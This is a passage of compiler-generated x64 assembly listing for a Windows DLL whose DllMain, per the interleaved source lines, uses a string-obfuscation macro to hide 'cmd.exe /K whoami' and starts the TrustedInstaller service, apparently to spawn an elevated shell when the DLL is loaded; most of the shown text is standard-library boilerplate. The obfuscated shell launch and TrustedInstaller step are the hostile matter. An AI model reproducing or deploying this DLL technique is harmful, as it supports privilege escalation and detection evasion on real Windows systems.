; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	$LN374@DllMain
$LN377@DllMain:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
	xorps	xmm0, xmm0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2053 :             _Myfirst = nullptr;

	movdqu	XMMWORD PTR cmd$7[rbp-256], xmm0

; 2054 :             _Mylast  = nullptr;
; 2055 :             _Myend   = nullptr;

	mov	QWORD PTR cmd$7[rbp-240], rdi
$LN358@DllMain:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR wstrCmd$8[rbp-232]
	cmp	rdx, 7

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN399@DllMain
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	lea	rdx, QWORD PTR [rdx*2+2]
	mov	rcx, QWORD PTR wstrCmd$8[rbp-256]
	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN413@DllMain

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	$LN410@DllMain
$LN413@DllMain:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN399@DllMain:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR wstrCmd$8[rbp-240], rdi

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR wstrCmd$8[rbp-232], 7

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	WORD PTR wstrCmd$8[rbp-256], di

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR strCmd$9[rbp-232]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN436@DllMain

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR strCmd$9[rbp-256]
	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN450@DllMain

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	SHORT $LN561@DllMain
$LN450@DllMain:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN436@DllMain:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp

; 76   : 	return TRUE;

	mov	eax, 1
$LN1@DllMain:

; 77   : }

	mov	rcx, QWORD PTR __$ArrayPad$[rbp-256]
	xor	rcx, rsp
	call	__security_check_cookie
	lea	r11, QWORD PTR [rsp+464]
	mov	rbx, QWORD PTR [r11+32]
	mov	rsi, QWORD PTR [r11+40]
	mov	rdi, QWORD PTR [r11+48]
	mov	rsp, r11
	pop	r14
	pop	r12
	pop	rbp
	ret	0
$LN561@DllMain:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN558@DllMain:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2741 :                 _Xlen_string(); // result too long

	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
	npad	1
$LN552@DllMain:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	npad	1
$LN559@DllMain:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2011 :             _Xlength();

	call	?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Xlength
	int	3
$LN560@DllMain:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN374@DllMain:

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN410@DllMain:
	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN556@DllMain:
DllMain	ENDP
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T2 = 80
obfuscator$3 = 88
obfuscator$4 = 120
obfuscator$5 = 168
$T6 = 192
cmd$7 = 224
wstrCmd$8 = 248
strCmd$9 = 280
si$10 = 320
pi$11 = 432
__$ArrayPad$ = 456
hModule$ = 496
ul_reason_for_call$ = 504
lpReserved$ = 512
DllMain$dtor$4 PROC
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?HMFAPKMMCAKKFABJ@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?HMFAPKMMCAKKFABJ@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
DllMain$dtor$4 ENDP
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T2 = 80
obfuscator$3 = 88
obfuscator$4 = 120
obfuscator$5 = 168
$T6 = 192
cmd$7 = 224
wstrCmd$8 = 248
strCmd$9 = 280
si$10 = 320
pi$11 = 432
__$ArrayPad$ = 456
hModule$ = 496
ul_reason_for_call$ = 504
lpReserved$ = 512
DllMain$dtor$5 PROC
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
DllMain$dtor$5 ENDP
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T2 = 80
obfuscator$3 = 88
obfuscator$4 = 120
obfuscator$5 = 168
$T6 = 192
cmd$7 = 224
wstrCmd$8 = 248
strCmd$9 = 280
si$10 = 320
pi$11 = 432
__$ArrayPad$ = 456
hModule$ = 496
ul_reason_for_call$ = 504
lpReserved$ = 512
DllMain$dtor$0 PROC
	lea	rcx, QWORD PTR strCmd$9[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
DllMain$dtor$0 ENDP
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T2 = 80
obfuscator$3 = 88
obfuscator$4 = 120
obfuscator$5 = 168
$T6 = 192
cmd$7 = 224
wstrCmd$8 = 248
strCmd$9 = 280
si$10 = 320
pi$11 = 432
__$ArrayPad$ = 456
hModule$ = 496
ul_reason_for_call$ = 504
lpReserved$ = 512
DllMain$dtor$1 PROC
	lea	rcx, QWORD PTR wstrCmd$8[rdx]
	jmp	??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
DllMain$dtor$1 ENDP
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T2 = 80
obfuscator$3 = 88
obfuscator$4 = 120
obfuscator$5 = 168
$T6 = 192
cmd$7 = 224
wstrCmd$8 = 248
strCmd$9 = 280
si$10 = 320
pi$11 = 432
__$ArrayPad$ = 456
hModule$ = 496
ul_reason_for_call$ = 504
lpReserved$ = 512
DllMain$dtor$2 PROC
	lea	rcx, QWORD PTR cmd$7[rdx]
	jmp	??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::~vector<wchar_t,std::allocator<wchar_t> >
DllMain$dtor$2 ENDP
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T2 = 80
obfuscator$3 = 88
obfuscator$4 = 120
obfuscator$5 = 168
$T6 = 192
cmd$7 = 224
wstrCmd$8 = 248
strCmd$9 = 280
si$10 = 320
pi$11 = 432
__$ArrayPad$ = 456
hModule$ = 496
ul_reason_for_call$ = 504
lpReserved$ = 512
DllMain$dtor$10 PROC
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
DllMain$dtor$10 ENDP
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp
;	COMDAT ??R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ
_TEXT	SEGMENT
obfuscator$ = 32
this$dead$ = 96
??R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ PROC ; `DllMain'::`4'::<lambda_1>::operator(), COMDAT

; 46   : 		std::string strCmd   = std::string(HIDE("C:\\Windows\\System32\\cmd.exe /K whoami"));

	push	rbx
	sub	rsp, 80					; 00000050H
	movdqa	xmm0, XMMWORD PTR __xmm@f84b90168c657a50f25b8d0688653364
	movdqa	xmm1, XMMWORD PTR __xmm@ea1fa840ff5c7142b35b8e0c830b3a4a
	mov	DWORD PTR obfuscator$[rsp+32], -1302829489 ; b258664fH
	mov	WORD PTR obfuscator$[rsp+36], 58118	; 0000e306H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN17@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [r8+rdx]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rbx+38], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp

; 46   : 		std::string strCmd   = std::string(HIDE("C:\\Windows\\System32\\cmd.exe /K whoami"));

	lea	rax, QWORD PTR [rbx+37]
	lea	rcx, QWORD PTR obfuscator$[rsp+37]
	cmp	rbx, rcx
	ja	SHORT $LN14@operator
	lea	rcx, QWORD PTR obfuscator$[rsp]
	cmp	rax, rcx
	jb	SHORT $LN14@operator
	movups	XMMWORD PTR [rbx], xmm0
	movups	XMMWORD PTR [rbx+16], xmm1
	mov	eax, DWORD PTR obfuscator$[rsp+32]
	mov	DWORD PTR [rbx+32], eax
	movzx	eax, WORD PTR obfuscator$[rsp+36]
	mov	WORD PTR [rbx+36], ax
	jmp	SHORT $LN20@operator
$LN14@operator:
	movups	XMMWORD PTR [rbx], xmm0
	movups	XMMWORD PTR [rbx+16], xmm1
	mov	ecx, DWORD PTR obfuscator$[rsp+32]
	mov	DWORD PTR [rbx+32], ecx
	movzx	ecx, WORD PTR obfuscator$[rsp+36]
	mov	WORD PTR [rbx+36], cx
$LN20@operator:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@YAXXZ ; ``DllMain'::`4'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 80					; 00000050H
	pop	rbx
	ret	0
$LN17@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 80					; 00000050H
	pop	rbx
	ret	0
??R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ ENDP ; `DllMain'::`4'::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
obfuscator$ = 32
this$dead$ = 96
?dtor$0@?0???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@4HA PROC ; ``DllMain'::`4'::<lambda_1>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@4HA ENDP ; ``DllMain'::`4'::<lambda_1>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp
;	COMDAT ??R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ
_TEXT	SEGMENT
obfuscator$ = 32
this$dead$ = 80
??R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ PROC ; `DllMain'::`4'::<lambda_2>::operator(), COMDAT

; 55   : 		DWORD  pid2  = ProcessUtilities::StartWindowsService(std::string(HIDE("TrustedInstaller")));

	push	rbx
	sub	rsp, 64					; 00000040H
	movdqa	xmm0, XMMWORD PTR __xmm@bd4045c34225ea7786414cdb5024eb4d
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN17@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [r8+rdx]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rbx+17], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp

; 55   : 		DWORD  pid2  = ProcessUtilities::StartWindowsService(std::string(HIDE("TrustedInstaller")));

	lea	rax, QWORD PTR [rbx+16]
	lea	rcx, QWORD PTR obfuscator$[rsp+16]
	cmp	rbx, rcx
	ja	SHORT $LN14@operator
	lea	rcx, QWORD PTR obfuscator$[rsp]
	cmp	rax, rcx
	jb	SHORT $LN14@operator
	movups	XMMWORD PTR [rbx], xmm0
	mov	BYTE PTR [rbx+16], 25
	jmp	SHORT $LN20@operator
$LN14@operator:
	movups	XMMWORD PTR [rbx], xmm0
	mov	BYTE PTR [rbx+16], 25
$LN20@operator:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@YAXXZ ; ``DllMain'::`4'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 64					; 00000040H
	pop	rbx
	ret	0
$LN17@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 64					; 00000040H
	pop	rbx
	ret	0
??R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ ENDP ; `DllMain'::`4'::<lambda_2>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
obfuscator$ = 32
this$dead$ = 80
?dtor$0@?0???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@4HA PROC ; ``DllMain'::`4'::<lambda_2>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@4HA ENDP ; ``DllMain'::`4'::<lambda_2>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@YAXXZ PROC ; ``DllMain'::`4'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	xorps	xmm0, xmm0
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@4V45@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	movups	XMMWORD PTR [rdx], xmm0
	mov	BYTE PTR [rdx+16], al
	ret	0
??__Fobfuscated_data@?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@YAXXZ ENDP ; ``DllMain'::`4'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@YAXXZ PROC ; ``DllMain'::`4'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	xorps	xmm0, xmm0
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@4V45@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	movups	XMMWORD PTR [rdx], xmm0
	movups	XMMWORD PTR [rdx+16], xmm0
	mov	DWORD PTR [rdx+32], eax
	mov	WORD PTR [rdx+36], ax
	ret	0
??__Fobfuscated_data@?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@YAXXZ ENDP ; ``DllMain'::`4'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
;	COMDAT ?__autoclassinit2@?$vector@_WV?$allocator@_W@std@@@std@@QEAAX_K@Z
_TEXT	SEGMENT
this$ = 8
classSize$dead$ = 16
?__autoclassinit2@?$vector@_WV?$allocator@_W@std@@@std@@QEAAX_K@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::__autoclassinit2, COMDAT
	xorps	xmm0, xmm0
	xor	eax, eax
	movups	XMMWORD PTR [rcx], xmm0
	mov	QWORD PTR [rcx+16], rax
	ret	0
?__autoclassinit2@?$vector@_WV?$allocator@_W@std@@@std@@QEAAX_K@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::__autoclassinit2
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??B?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 48
??B?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAAPEADXZ PROC ; ay::obfuscated_data<17,-3520361701531608807,char>::operator char *, COMDAT

; 139  : 		{

$LN4:
	sub	rsp, 40					; 00000028H
	mov	r11, rcx

; 140  : 			decrypt();

	call	?decrypt@?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAAXXZ ; ay::obfuscated_data<17,-3520361701531608807,char>::decrypt

; 141  : 			return m_data;

	mov	rax, r11

; 142  : 		}

	add	rsp, 40					; 00000028H
	ret	0
??B?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAAPEADXZ ENDP ; ay::obfuscated_data<17,-3520361701531608807,char>::operator char *
_TEXT	ENDS
; Function compile flags: /Ogtpy
